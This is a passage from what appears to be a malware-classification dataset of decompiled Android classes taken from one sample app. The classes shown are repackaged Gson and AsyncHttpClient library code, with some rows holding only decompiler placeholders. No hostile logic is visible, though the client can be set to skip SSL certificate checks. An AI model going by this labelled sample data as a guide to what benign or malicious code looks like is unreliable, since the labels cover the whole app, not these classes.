(!this.stack.isEmpty()) {       throw new IOException(""Incomplete document"");     }     this.stack.add(SENTINEL_CLOSED);   }   @Override public JsonWriter endArray(){     if (this.stack.isEmpty() || this.pendingName != null) {       throw new IllegalStateException();     }     if (!(peek() instanceof JsonArray)) {       throw new IllegalStateException();     }     this.stack.remove(this.stack.size() - 1);     return this;   }   @Override public JsonWriter endObject(){     if (this.stack.isEmpty() || this.pendingName != null) {       throw new IllegalStateException();     }     if (!(peek() instanceof JsonObject)) {       throw new IllegalStateException();     }     this.stack.remove(this.stack.size() - 1);     return this;   }   @Override public void flush(){   }   public JsonElement get(){     if (this.stack.isEmpty()) {       return this.product;     }     throw new IllegalStateException(""Expected one JSON element but was "" + this.stack);   }   @Override public JsonWriter name(  String str){     if (this.stack.isEmpty() || this.pendingName != null) {       throw new IllegalStateException();     }     if (!(peek() instanceof JsonObject)) {       throw new IllegalStateException();     }     this.pendingName=str;     return this;   }   @Override public JsonWriter nullValue(){     put(JsonNull.INSTANCE);     return this;   }   @Override public JsonWriter value(  double d){     if (!isLenient() && (Double.isNaN(d) || Double.isInfinite(d))) {       throw new IllegalArgumentException(""JSON forbids NaN and infinities: "" + d);     }     put(new JsonPrimitive((Number)Double.valueOf(d)));     return this;   }   @Override public JsonWriter value(  long j){     put(new JsonPrimitive((Number)Long.valueOf(j)));     return this;   }   @Override public JsonWriter value(  Number number){     if (number == null) {       return nullValue();     }     if (!isLenient()) {       double doubleValue=number.doubleValue();       if (Double.isNaN(doubleValue) || Double.isInfinite(doubleValue)) {         throw new IllegalArgumentException(""JSON forbids NaN and infinities: "" + number);       }     }     put(new JsonPrimitive(number));     return this;   }   @Override public JsonWriter value(  String str){     if (str == null) {       return nullValue();     }     put(new JsonPrimitive(str));     return this;   }   @Override public JsonWriter value(  boolean z){     put(new JsonPrimitive(Boolean.valueOf(z)));     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\MapTypeAdapterFactory.code","public final class MapTypeAdapterFactory implements TypeAdapterFactory {   private final boolean complexMapKeySerialization;   private final ConstructorConstructor constructorConstructor; final class Adapter<K,V> extends TypeAdapter<Map<K,V>> {     private final ObjectConstructor<? extends Map<K,V>> constructor;     private final TypeAdapter<K> keyTypeAdapter;     private final TypeAdapter<V> valueTypeAdapter;     public Adapter(    Gson gson,    Type type,    TypeAdapter<K> typeAdapter,    Type type2,    TypeAdapter<V> typeAdapter2,    ObjectConstructor<? extends Map<K,V>> objectConstructor){       this.keyTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);       this.valueTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter2,type2);       this.constructor=objectConstructor;     }     private String keyToString(    JsonElement jsonElement){       if (!jsonElement.isJsonPrimitive()) {         if (jsonElement.isJsonNull()) {           return ""null"";         }         throw new AssertionError();       }       JsonPrimitive asJsonPrimitive=jsonElement.getAsJsonPrimitive();       if (asJsonPrimitive.isNumber()) {         return String.valueOf(asJsonPrimitive.getAsNumber());       }       if (asJsonPrimitive.isBoolean()) {         return Boolean.toString(asJsonPrimitive.getAsBoolean());       }       if (asJsonPrimitive.isString()) {         return asJsonPrimitive.getAsString();       }       throw new AssertionError();     }     @Override public Map<K,V> read(    JsonReader jsonReader){       JsonToken peek=jsonReader.peek();       if (peek == JsonToken.NULL) {         jsonReader.nextNull();         return null;       }       Map<K,V> construct=this.constructor.construct();       if (peek != JsonToken.BEGIN_ARRAY) {         jsonReader.beginObject();         while (jsonReader.hasNext()) {           JsonReaderInternalAccess.INSTANCE.promoteNameToValue(jsonReader);           K read=this.keyTypeAdapter.read(jsonReader);           if (construct.put(read,this.valueTypeAdapter.read(jsonReader)) != null) {             throw new JsonSyntaxException(""duplicate key: "" + read);           }         }         jsonReader.endObject();         return construct;       }       jsonReader.beginArray();       while (jsonReader.hasNext()) {         jsonReader.beginArray();         K read2=this.keyTypeAdapter.read(jsonReader);         if (construct.put(read2,this.valueTypeAdapter.read(jsonReader)) != null) {           throw new JsonSyntaxException(""duplicate key: "" + read2);         }         jsonReader.endArray();       }       jsonReader.endArray();       return construct;     }     @Override public void write(    JsonWriter jsonWriter,    Map<K,V> map){       int i=0;       if (map == null) {         jsonWriter.nullValue();         return;       }       if (!MapTypeAdapterFactory.this.complexMapKeySerialization) {         jsonWriter.beginObject();         for (        Map.Entry<K,V> entry : map.entrySet()) {           jsonWriter.name(String.valueOf(entry.getKey()));           this.valueTypeAdapter.write(jsonWriter,entry.getValue());         }         jsonWriter.endObject();         return;       }       ArrayList arrayList=new ArrayList(map.size());       ArrayList arrayList2=new ArrayList(map.size());       boolean z=false;       for (      Map.Entry<K,V> entry2 : map.entrySet()) {         JsonElement jsonTree=this.keyTypeAdapter.toJsonTree(entry2.getKey());         arrayList.add(jsonTree);         arrayList2.add(entry2.getValue());         z=(jsonTree.isJsonArray() || jsonTree.isJsonObject()) | z;       }       if (!z) {         jsonWriter.beginObject();         while (i < arrayList.size()) {           jsonWriter.name(keyToString((JsonElement)arrayList.get(i)));           this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));           i++;         }         jsonWriter.endObject();         return;       }       jsonWriter.beginArray();       while (i < arrayList.size()) {         jsonWriter.beginArray();         Streams.write((JsonElement)arrayList.get(i),jsonWriter);         this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));         jsonWriter.endArray();         i++;       }       jsonWriter.endArray();     }   }   public MapTypeAdapterFactory(  ConstructorConstructor constructorConstructor,  boolean z){     this.constructorConstructor=constructorConstructor;     this.complexMapKeySerialization=z;   }   private TypeAdapter<?> getKeyAdapter(  Gson gson,  Type type){     return (type == Boolean.TYPE || type == Boolean.class) ? TypeAdapters.BOOLEAN_AS_STRING : gson.getAdapter(TypeToken.get(type));   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     Type type=typeToken.getType();     if (!Map.class.isAssignableFrom(typeToken.getRawType())) {       return null;     }     Type[] mapKeyAndValueTypes=C$Gson$Types.getMapKeyAndValueTypes(type,C$Gson$Types.getRawType(type));     return new Adapter(gson,mapKeyAndValueTypes[0],getKeyAdapter(gson,mapKeyAndValueTypes[0]),mapKeyAndValueTypes[1],gson.getAdapter(TypeToken.get(mapKeyAndValueTypes[1])),this.constructorConstructor.get(typeToken));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\ObjectTypeAdapter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6f485875"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\ReflectiveTypeAdapterFactory.code","public final class ReflectiveTypeAdapterFactory implements TypeAdapterFactory {   private final ConstructorConstructor constructorConstructor;   private final Excluder excluder;   private final FieldNamingStrategy fieldNamingPolicy; public final class Adapter<T> extends TypeAdapter<T> {     private final Map<String,BoundField> boundFields;     private final ObjectConstructor<T> constructor;     private Adapter(    ObjectConstructor<T> objectConstructor,    Map<String,BoundField> map){       this.constructor=objectConstructor;       this.boundFields=map;     }     @Override public T read(    JsonReader jsonReader){       if (jsonReader.peek() == JsonToken.NULL) {         jsonReader.nextNull();         return null;       }       T construct=this.constructor.construct();       try {         jsonReader.beginObject();         while (jsonReader.hasNext()) {           BoundField boundField=this.boundFields.get(jsonReader.nextName());           if (boundField == null || !boundField.deserialized) {             jsonReader.skipValue();           }  else {             boundField.read(jsonReader,construct);           }         }         jsonReader.endObject();         return construct;       }  catch (      IllegalAccessException e) {         throw new AssertionError(e);       } catch (      IllegalStateException e2) {         throw new JsonSyntaxException(e2);       }     }     @Override public void write(    JsonWriter jsonWriter,    T t){       if (t == null) {         jsonWriter.nullValue();         return;       }       jsonWriter.beginObject();       try {         for (        BoundField boundField : this.boundFields.values()) {           if (boundField.serialized) {             jsonWriter.name(boundField.name);             boundField.write(jsonWriter,t);           }         }         jsonWriter.endObject();       }  catch (      IllegalAccessException e) {         throw new AssertionError();       }     }   } public abstract class BoundField {     final boolean deserialized;     final String name;     final boolean serialized;     protected BoundField(    String str,    boolean z,    boolean z2){       this.name=str;       this.serialized=z;       this.deserialized=z2;     }     abstract void read(    JsonReader jsonReader,    Object obj);     abstract void write(    JsonWriter jsonWriter,    Object obj);   }   public ReflectiveTypeAdapterFactory(  ConstructorConstructor constructorConstructor,  FieldNamingStrategy fieldNamingStrategy,  Excluder excluder){     this.constructorConstructor=constructorConstructor;     this.fieldNamingPolicy=fieldNamingStrategy;     this.excluder=excluder;   }   private BoundField createBoundField(  final Gson gson,  final Field field,  String str,  final TypeToken<?> typeToken,  boolean z,  boolean z2){     final boolean isPrimitive=Primitives.isPrimitive(typeToken.getRawType());     return new BoundField(str,z,z2){       final TypeAdapter<?> typeAdapter; {         this.typeAdapter=gson.getAdapter(typeToken);       }       @Override void read(      JsonReader jsonReader,      Object obj){         Object read=this.typeAdapter.read(jsonReader);         if (read == null && isPrimitive) {           return;         }         field.set(obj,read);       }       @Override void write(      JsonWriter jsonWriter,      Object obj){         new TypeAdapterRuntimeTypeWrapper(gson,this.typeAdapter,typeToken.getType()).write(jsonWriter,field.get(obj));       }     } ;   }   private Map<String,BoundField> getBoundFields(  Gson gson,  TypeToken<?> typeToken,  Class<?> cls){     LinkedHashMap linkedHashMap=new LinkedHashMap();     if (cls.isInterface()) {       return linkedHashMap;     }     Type type=typeToken.getType();     while (cls != Object.class) {       for (      Field field : cls.getDeclaredFields()) {         boolean excludeField=excludeField(field,true);         boolean excludeField2=excludeField(field,false);         if (excludeField || excludeField2) {           field.setAccessible(true);           BoundField createBoundField=createBoundField(gson,field,getFieldName(field),TypeToken.get(C$Gson$Types.resolve(typeToken.getType(),cls,field.getGenericType())),excludeField,excludeField2);           BoundField boundField=(BoundField)linkedHashMap.put(createBoundField.name,createBoundField);           if (boundField != null) {             throw new IllegalArgumentException(type + "" declares multiple JSON fields named "" + boundField.name);           }         }       }       typeToken=TypeToken.get(C$Gson$Types.resolve(typeToken.getType(),cls,cls.getGenericSuperclass()));       cls=typeToken.getRawType();     }     return linkedHashMap;   }   private String getFieldName(  Field field){     SerializedName serializedName=(SerializedName)field.getAnnotation(SerializedName.class);     return serializedName == null ? this.fieldNamingPolicy.translateName(field) : serializedName.value();   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     Class<? super T> rawType=typeToken.getRawType();     if (Object.class.isAssignableFrom(rawType)) {       return new Adapter(this.constructorConstructor.get(typeToken),getBoundFields(gson,typeToken,rawType));     }     return null;   }   public boolean excludeField(  Field field,  boolean z){     return (this.excluder.excludeClass(field.getType(),z) || this.excluder.excludeField(field,z)) ? false : true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\SqlDateTypeAdapter.code","public final class SqlDateTypeAdapter extends TypeAdapter<Date> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (typeToken.getRawType() == Date.class) {         return new SqlDateTypeAdapter();       }       return null;     }   } ;   private final DateFormat format=new SimpleDateFormat(""MMM d, yyyy"");   @Override public synchronized Date read(  JsonReader jsonReader){     Date date;     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       date=null;     }  else {       try {         date=new Date(this.format.parse(jsonReader.nextString()).getTime());       }  catch (      ParseException e) {         throw new JsonSyntaxException(e);       }     }     return date;   }   @Override public synchronized void write(  JsonWriter jsonWriter,  Date date){     jsonWriter.value(date == null ? null : this.format.format((java.util.Date)date));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\TimeTypeAdapter.code","public final class TimeTypeAdapter extends TypeAdapter<Time> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (typeToken.getRawType() == Time.class) {         return new TimeTypeAdapter();       }       return null;     }   } ;   private final DateFormat format=new SimpleDateFormat(""hh:mm:ss a"");   @Override public synchronized Time read(  JsonReader jsonReader){     Time time;     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       time=null;     }  else {       try {         time=new Time(this.format.parse(jsonReader.nextString()).getTime());       }  catch (      ParseException e) {         throw new JsonSyntaxException(e);       }     }     return time;   }   @Override public synchronized void write(  JsonWriter jsonWriter,  Time time){     jsonWriter.value(time == null ? null : this.format.format((Date)time));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\TypeAdapterRuntimeTypeWrapper.code","public final class TypeAdapterRuntimeTypeWrapper<T> extends TypeAdapter<T> {   private final Gson context;   private final TypeAdapter<T> delegate;   private final Type type;   public TypeAdapterRuntimeTypeWrapper(  Gson gson,  TypeAdapter<T> typeAdapter,  Type type){     this.context=gson;     this.delegate=typeAdapter;     this.type=type;   }   private Type getRuntimeTypeIfMoreSpecific(  Type type,  Object obj){     return obj != null ? (type == Object.class || (type instanceof TypeVariable) || (type instanceof Class)) ? obj.getClass() : type : type;   }   @Override public T read(  JsonReader jsonReader){     return this.delegate.read(jsonReader);   }   @Override public void write(  JsonWriter jsonWriter,  T t){     TypeAdapter<T> typeAdapter=this.delegate;     Type runtimeTypeIfMoreSpecific=getRuntimeTypeIfMoreSpecific(this.type,t);     if (runtimeTypeIfMoreSpecific != this.type) {       typeAdapter=this.context.getAdapter(TypeToken.get(runtimeTypeIfMoreSpecific));       if ((typeAdapter instanceof ReflectiveTypeAdapterFactory.Adapter) && !(this.delegate instanceof ReflectiveTypeAdapterFactory.Adapter)) {         typeAdapter=this.delegate;       }     }     typeAdapter.write(jsonWriter,t);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\TypeAdapters.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1a445366"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.reflect\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.reflect\TypeToken.code","public class TypeToken<T> {   final int hashCode;   final Class<? super T> rawType;   final Type type;   public TypeToken(){     this.type=getSuperclassTypeParameter(getClass());     this.rawType=(Class<? super T>)C$Gson$Types.getRawType(this.type);     this.hashCode=this.type.hashCode();   }   TypeToken(  Type type){     this.type=C$Gson$Types.canonicalize((Type)C$Gson$Preconditions.checkNotNull(type));     this.rawType=(Class<? super T>)C$Gson$Types.getRawType(this.type);     this.hashCode=this.type.hashCode();   }   private static AssertionError buildUnexpectedTypeError(  Type type,  Class<?>... clsArr){     StringBuilder sb=new StringBuilder(""Unexpected type. Expected one of: "");     for (    Class<?> cls : clsArr) {       sb.append(cls.getName()).append("", "");     }     sb.append(""but got: "").append(type.getClass().getName()).append("", for type token: "").append(type.toString()).append('.');     return new AssertionError(sb.toString());   }   public static <T>TypeToken<T> get(  Class<T> cls){     return new TypeToken<>(cls);   }   public static TypeToken<?> get(  Type type){     return new TypeToken<>(type);   }   static Type getSuperclassTypeParameter(  Class<?> cls){     Type genericSuperclass=cls.getGenericSuperclass();     if (genericSuperclass instanceof Class) {       throw new RuntimeException(""Missing type parameter."");     }     return C$Gson$Types.canonicalize(((ParameterizedType)genericSuperclass).getActualTypeArguments()[0]);   }   private static boolean isAssignableFrom(  Type type,  GenericArrayType genericArrayType){     Type genericComponentType=genericArrayType.getGenericComponentType();     if (!(genericComponentType instanceof ParameterizedType)) {       return true;     }     if (type instanceof GenericArrayType) {       type=((GenericArrayType)type).getGenericComponentType();     }  else     if (type instanceof Class) {       type=(Class)type;       while (type.isArray()) {         type=type.getComponentType();       }     }     return isAssignableFrom(type,(ParameterizedType)genericComponentType,new HashMap());   }   private static boolean isAssignableFrom(  Type type,  ParameterizedType parameterizedType,  Map<String,Type> map){     if (type == null) {       return false;     }     if (parameterizedType.equals(type)) {       return true;     }     Class<?> rawType=C$Gson$Types.getRawType(type);     ParameterizedType parameterizedType2=type instanceof ParameterizedType ? (ParameterizedType)type : null;     if (parameterizedType2 != null) {       Type[] actualTypeArguments=parameterizedType2.getActualTypeArguments();       TypeVariable<Class<?>>[] typeParameters=rawType.getTypeParameters();       for (int i=0; i < actualTypeArguments.length; i++) {         Type type2=actualTypeArguments[i];         TypeVariable<Class<?>> typeVariable=typeParameters[i];         while (type2 instanceof TypeVariable) {           type2=map.get(((TypeVariable)type2).getName());         }         map.put(typeVariable.getName(),type2);       }       if (typeEquals(parameterizedType2,parameterizedType,map)) {         return true;       }     }     for (    Type type3 : rawType.getGenericInterfaces()) {       if (isAssignableFrom(type3,parameterizedType,new HashMap(map))) {         return true;       }     }     return isAssignableFrom(rawType.getGenericSuperclass(),parameterizedType,new HashMap(map));   }   private static boolean matches(  Type type,  Type type2,  Map<String,Type> map){     return type2.equals(type) || ((type instanceof TypeVariable) && type2.equals(map.get(((TypeVariable)type).getName())));   }   private static boolean typeEquals(  ParameterizedType parameterizedType,  ParameterizedType parameterizedType2,  Map<String,Type> map){     if (!parameterizedType.getRawType().equals(parameterizedType2.getRawType())) {       return false;     }     Type[] actualTypeArguments=parameterizedType.getActualTypeArguments();     Type[] actualTypeArguments2=parameterizedType2.getActualTypeArguments();     for (int i=0; i < actualTypeArguments.length; i++) {       if (!matches(actualTypeArguments[i],actualTypeArguments2[i],map)) {         return false;       }     }     return true;   }   public final boolean equals(  Object obj){     return (obj instanceof TypeToken) && C$Gson$Types.equals(this.type,((TypeToken)obj).type);   }   public final Class<? super T> getRawType(){     return this.rawType;   }   public final Type getType(){     return this.type;   }   public final int hashCode(){     return this.hashCode;   }   @Deprecated public boolean isAssignableFrom(  TypeToken<?> typeToken){     return isAssignableFrom(typeToken.getType());   }   @Deprecated public boolean isAssignableFrom(  Class<?> cls){     return isAssignableFrom((Type)cls);   }   @Deprecated public boolean isAssignableFrom(  Type type){     if (type == null) {       return false;     }     if (this.type.equals(type)) {       return true;     }     if (this.type instanceof Class) {       return this.rawType.isAssignableFrom(C$Gson$Types.getRawType(type));     }     if (this.type instanceof ParameterizedType) {       return isAssignableFrom(type,(ParameterizedType)this.type,new HashMap());     }     if (this.type instanceof GenericArrayType) {       return this.rawType.isAssignableFrom(C$Gson$Types.getRawType(type)) && isAssignableFrom(type,(GenericArrayType)this.type);     }     throw buildUnexpectedTypeError(this.type,Class.class,ParameterizedType.class,GenericArrayType.class);   }   public final String toString(){     return C$Gson$Types.typeToString(this.type);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.stream\JsonReader.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5375a9b1"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.stream\JsonScope.code","final class JsonScope {   static final int CLOSED=8;   static final int DANGLING_NAME=4;   static final int EMPTY_ARRAY=1;   static final int EMPTY_DOCUMENT=6;   static final int EMPTY_OBJECT=3;   static final int NONEMPTY_ARRAY=2;   static final int NONEMPTY_DOCUMENT=7;   static final int NONEMPTY_OBJECT=5;   JsonScope(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.stream\JsonWriter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@23b91565"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.stream\MalformedJsonException.code","public final class MalformedJsonException extends IOException {   private static final long serialVersionUID=1;   public MalformedJsonException(  String str){     super(str);   }   public MalformedJsonException(  String str,  Throwable th){     super(str);     initCause(th);   }   public MalformedJsonException(  Throwable th){     initCause(th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\AsyncHttpClient.code","public class AsyncHttpClient {   public static final int DEFAULT_MAX_CONNECTIONS=10;   public static final int DEFAULT_MAX_RETRIES=5;   public static final int DEFAULT_RETRY_SLEEP_TIME_MILLIS=1500;   public static final int DEFAULT_SOCKET_BUFFER_SIZE=8192;   public static final int DEFAULT_SOCKET_TIMEOUT=10000;   public static final String ENCODING_GZIP=""gzip"";   public static final String HEADER_ACCEPT_ENCODING=""Accept-Encoding"";   public static final String HEADER_CONTENT_DISPOSITION=""Content-Disposition"";   public static final String HEADER_CONTENT_ENCODING=""Content-Encoding"";   public static final String HEADER_CONTENT_RANGE=""Content-Range"";   public static final String HEADER_CONTENT_TYPE=""Content-Type"";   public static final String LOG_TAG=""AsyncHttpClient"";   private final Map<String,String> clientHeaderMap;   private final DefaultHttpClient httpClient;   private final HttpContext httpContext;   private boolean isUrlEncodingEnabled;   private int maxConnections;   private final Map<Context,List<RequestHandle>> requestMap;   private ExecutorService threadPool;   private int timeout; class InflatingEntity extends HttpEntityWrapper {     GZIPInputStream gzippedStream;     PushbackInputStream pushbackStream;     InputStream wrappedStream;     public InflatingEntity(    HttpEntity httpEntity){       super(httpEntity);     }     @Override public void consumeContent(){       AsyncHttpClient.silentCloseInputStream(this.wrappedStream);       AsyncHttpClient.silentCloseInputStream(this.pushbackStream);       AsyncHttpClient.silentCloseInputStream(this.gzippedStream);       super.consumeContent();     }     @Override public InputStream getContent(){       this.wrappedStream=this.wrappedEntity.getContent();       this.pushbackStream=new PushbackInputStream(this.wrappedStream,2);       if (!AsyncHttpClient.isInputStreamGZIPCompressed(this.pushbackStream)) {         return this.pushbackStream;       }       this.gzippedStream=new GZIPInputStream(this.pushbackStream);       return this.gzippedStream;     }     @Override public long getContentLength(){       return -1L;     }   }   public AsyncHttpClient(){     this(false,80,443);   }   public AsyncHttpClient(  int i){     this(false,i,443);   }   public AsyncHttpClient(  int i,  int i2){     this(false,i,i2);   }   public AsyncHttpClient(  SchemeRegistry schemeRegistry){     this.maxConnections=10;     this.timeout=DEFAULT_SOCKET_TIMEOUT;     this.isUrlEncodingEnabled=true;     BasicHttpParams basicHttpParams=new BasicHttpParams();     ConnManagerParams.setTimeout(basicHttpParams,this.timeout);     ConnManagerParams.setMaxConnectionsPerRoute(basicHttpParams,new ConnPerRouteBean(this.maxConnections));     ConnManagerParams.setMaxTotalConnections(basicHttpParams,10);     HttpConnectionParams.setSoTimeout(basicHttpParams,this.timeout);     HttpConnectionParams.setConnectionTimeout(basicHttpParams,this.timeout);     HttpConnectionParams.setTcpNoDelay(basicHttpParams,true);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,8192);     HttpProtocolParams.setVersion(basicHttpParams,HttpVersion.HTTP_1_1);     ThreadSafeClientConnManager threadSafeClientConnManager=new ThreadSafeClientConnManager(basicHttpParams,schemeRegistry);     this.threadPool=getDefaultThreadPool();     this.requestMap=Collections.synchronizedMap(new WeakHashMap());     this.clientHeaderMap=new HashMap();     this.httpContext=new SyncBasicHttpContext(new BasicHttpContext());     this.httpClient=new DefaultHttpClient(threadSafeClientConnManager,basicHttpParams);     this.httpClient.addRequestInterceptor(new HttpRequestInterceptor(){       @Override public void process(      HttpRequest httpRequest,      HttpContext httpContext){         if (!httpRequest.containsHeader(AsyncHttpClient.HEADER_ACCEPT_ENCODING)) {           httpRequest.addHeader(AsyncHttpClient.HEADER_ACCEPT_ENCODING,AsyncHttpClient.ENCODING_GZIP);         }         for (        String str : AsyncHttpClient.this.clientHeaderMap.keySet()) {           if (httpRequest.containsHeader(str)) {             Header firstHeader=httpRequest.getFirstHeader(str);             Log.d(AsyncHttpClient.LOG_TAG,String.format(""Headers were overwritten! (%s | %s) overwrites (%s | %s)"",str,AsyncHttpClient.this.clientHeaderMap.get(str),firstHeader.getName(),firstHeader.getValue()));           }           httpRequest.addHeader(str,(String)AsyncHttpClient.this.clientHeaderMap.get(str));         }       }     } );     this.httpClient.addResponseInterceptor(new HttpResponseInterceptor(){       @Override public void process(      HttpResponse httpResponse,      HttpContext httpContext){         Header contentEncoding;         HttpEntity entity=httpResponse.getEntity();         if (entity == null || (contentEncoding=entity.getContentEncoding()) == null) {           return;         }         HeaderElement[] elements=contentEncoding.getElements();         for (        HeaderElement headerElement : elements) {           if (headerElement.getName().equalsIgnoreCase(AsyncHttpClient.ENCODING_GZIP)) {             httpResponse.setEntity(new InflatingEntity(entity));             return;           }         }       }     } );     this.httpClient.addRequestInterceptor(new HttpRequestInterceptor(){       @Override public void process(      HttpRequest httpRequest,      HttpContext httpContext){         Credentials credentials;         AuthState authState=(AuthState)httpContext.getAttribute(""http.auth.target-scope"");         CredentialsProvider credentialsProvider=(CredentialsProvider)httpContext.getAttribute(""http.auth.credentials-provider"");         HttpHost httpHost=(HttpHost)httpContext.getAttribute(""http.target_host"");         if (authState.getAuthScheme() != null || (credentials=credentialsProvider.getCredentials(new AuthScope(httpHost.getHostName(),httpHost.getPort()))) == null) {           return;         }         authState.setAuthScheme(new BasicScheme());         authState.setCredentials(credentials);       }     } ,0);     this.httpClient.setHttpRequestRetryHandler(new RetryHandler(5,DEFAULT_RETRY_SLEEP_TIME_MILLIS));   }   public AsyncHttpClient(  boolean z,  int i,  int i2){     this(getDefaultSchemeRegistry(z,i,i2));   }   private HttpEntityEnclosingRequestBase addEntityToRequestBase(  HttpEntityEnclosingRequestBase httpEntityEnclosingRequestBase,  HttpEntity httpEntity){     if (httpEntity != null) {       httpEntityEnclosingRequestBase.setEntity(httpEntity);     }     return httpEntityEnclosingRequestBase;   }   public static void allowRetryExceptionClass(  Class<?> cls){     if (cls != null) {       RetryHandler.addClassToWhitelist(cls);     }   }   public static void blockRetryExceptionClass(  Class<?> cls){     if (cls != null) {       RetryHandler.addClassToBlacklist(cls);     }   }   public static void endEntityViaReflection(  HttpEntity httpEntity){     Field field;     if (httpEntity instanceof HttpEntityWrapper) {       try {         Field[] declaredFields=HttpEntityWrapper.class.getDeclaredFields();         int length=declaredFields.length;         int i=0;         while (true) {           if (i >= length) {             field=null;             break;           }           field=declaredFields[i];           if (field.getName().equals(""wrappedEntity"")) {             break;           }  else {             i++;           }         }         if (field != null) {           field.setAccessible(true);           HttpEntity httpEntity2=(HttpEntity)field.get(httpEntity);           if (httpEntity2 != null) {             httpEntity2.consumeContent();           }         }       }  catch (      Throwable th) {         Log.e(LOG_TAG,""wrappedEntity consume"",th);       }     }   }   private static SchemeRegistry getDefaultSchemeRegistry(  boolean z,  int i,  int i2){     if (z) {       Log.d(LOG_TAG,""Beware! Using the fix is insecure, as it doesn't verify SSL certificates."");     }     if (i < 1) {       i=80;       Log.d(LOG_TAG,""Invalid HTTP port number specified, defaulting to 80"");     }     if (i2 < 1) {       i2=443;       Log.d(LOG_TAG,""Invalid HTTPS port number specified, defaulting to 443"");     }     SSLSocketFactory fixedSocketFactory=z ? MySSLSocketFactory.getFixedSocketFactory() : SSLSocketFactory.getSocketFactory();     SchemeRegistry schemeRegistry=new SchemeRegistry();     schemeRegistry.register(new Scheme(""http"",PlainSocketFactory.getSocketFactory(),i));     schemeRegistry.register(new Scheme(""https"",fixedSocketFactory,i2));     return schemeRegistry;   }   public static String getUrlWithQueryString(  boolean z,  String str,  RequestParams requestParams){     if (str == null) {       return null;     }     String replace=z ? str.replace("" "",""%20"") : str;     if (requestParams == null) {       return replace;     }     String trim=requestParams.getParamString().trim();     if (trim.equals("""") || trim.equals(""?"")) {       return replace;     }     return (replace + (replace.contains(""?"") ? ""&"" : ""?"")) + trim;   }   public static boolean isInputStreamGZIPCompressed(  PushbackInputStream pushbackInputStream){     if (pushbackInputStream == null) {       return false;     }     byte[] bArr=new byte[2];     int read=pushbackInputStream.read(bArr);     pushbackInputStream.unread(bArr);     return read == 2 && 35615 == (((bArr[1] << 8) & 65280) | (bArr[0] & 255));   }   private HttpEntity paramsToEntity(  RequestParams requestParams,  ResponseHandlerInterface responseHandlerInterface){     if (requestParams == null) {       return null;     }     try {       return requestParams.getEntity(responseHandlerInterface);     }  catch (    IOException e) {       if (responseHandlerInterface != null) {         responseHandlerInterface.sendFailureMessage(0,null,null,e);         return null;       }       e.printStackTrace();       return null;     }   }   public static void silentCloseInputStream(  InputStream inputStream){     if (inputStream != null) {       try {         inputStream.close();       }  catch (      IOException e) {         Log.w(LOG_TAG,""Cannot close input stream"",e);       }     }   }   public static void silentCloseOutputStream(  OutputStream outputStream){     if (outputStream != null) {       try {         outputStream.close();       }  catch (      IOException e) {         Log.w(LOG_TAG,""Cannot close output stream"",e);       }     }   }   public void addHeader(  String str,  String str2){     this.clientHeaderMap.put(str,str2);   }   public void cancelAllRequests(  boolean z){     for (    List<RequestHandle> list : this.requestMap.values()) {       if (list != null) {         Iterator<RequestHandle> it=list.iterator();         while (it.hasNext()) {           it.next().cancel(z);         }       }     }     this.requestMap.clear();   }   public void cancelRequests(  final Context context,  final boolean z){     if (context == null) {       Log.e(LOG_TAG,""Passed null Context to 